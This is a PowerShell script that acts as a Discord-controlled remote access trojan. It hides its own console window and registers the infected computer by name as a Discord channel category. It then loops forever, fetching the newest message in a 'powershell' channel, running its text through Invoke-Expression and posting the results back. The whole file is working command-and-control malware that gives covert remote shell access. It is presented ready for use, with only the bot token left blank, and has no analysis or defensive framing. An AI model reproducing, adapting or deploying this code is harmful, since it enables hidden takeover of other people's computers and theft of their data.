# =====================================================================================================================================================
$global:token = "" 
$HideConsole = 1 # Hide the console window

# Function to create a new category for text channels
Function NewChannelCategory {
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $guildID = $null
    while (!($guildID)) {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)
        $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
        $guilds = $response | ConvertFrom-Json
        foreach ($guild in $guilds) {
            $guildID = $guild.id
        }
        sleep 3
    }
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $body = @{
        "name" = "$env:COMPUTERNAME"
        "type" = 4
    } | ConvertTo-Json
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")
    $wc.Headers.Add("Content-Type", "application/json")
    $response = $wc.UploadString($uri, "POST", $body)
    $responseObj = ConvertFrom-Json $response
    $global:CategoryID = $responseObj.id
}

# Function to create a new channel
Function NewChannel {
    param([string]$name)
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)
    $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
    $guilds = $response | ConvertFrom-Json
    foreach ($guild in $guilds) {
        $guildID = $guild.id
    }
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $body = @{
        "name" = "$name"
        "type" = 0
        "parent_id" = $CategoryID
    } | ConvertTo-Json
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")
    $wc.Headers.Add("Content-Type", "application/json")
    $response = $wc.UploadString($uri, "POST", $body)
    $responseObj = ConvertFrom-Json $response
    $global:ChannelID = $responseObj.id
}

# Function to send a message to Discord
Function sendMsg {
    param([string]$Message)
    $url = "https://discord.com/api/v10/channels/$PowershellID/messages"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")
    if ($Message) {
        $jsonBody = @{
            "content" = "$Message"
            "username" = "$env:COMPUTERNAME"
        } | ConvertTo-Json
        $wc.Headers.Add("Content-Type", "application/json")
        $response = $wc.UploadString($url, "POST", $jsonBody)
    }
}

# Main setup
If ($HideConsole -eq 1) {
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    $Type::ShowWindowAsync($hwnd, 0)
}

NewChannelCategory
sleep 1
NewChannel -name 'powershell'
$global:PowershellID = $ChannelID

# Main loop to listen for commands
while ($true) {
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)
    $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$PowershellID/messages")
    $most_recent_message = ($messages | ConvertFrom-Json)[0]
    if ($most_recent_message.author.id -ne $botId) {
        $latestMessageId = $most_recent_message.timestamp
        $messages = $most_recent_message.content
    }
    if ($latestMessageId -ne $lastMessageId) {
        $lastMessageId = $latestMessageId
        $global:latestMessageContent = $messages
        try {
            $result = Invoke-Expression $messages
            sendMsg -Message $result
        } catch {
            sendMsg -Message "Error: $($_.Exception.Message)"
        }
    }
    sleep 3
}

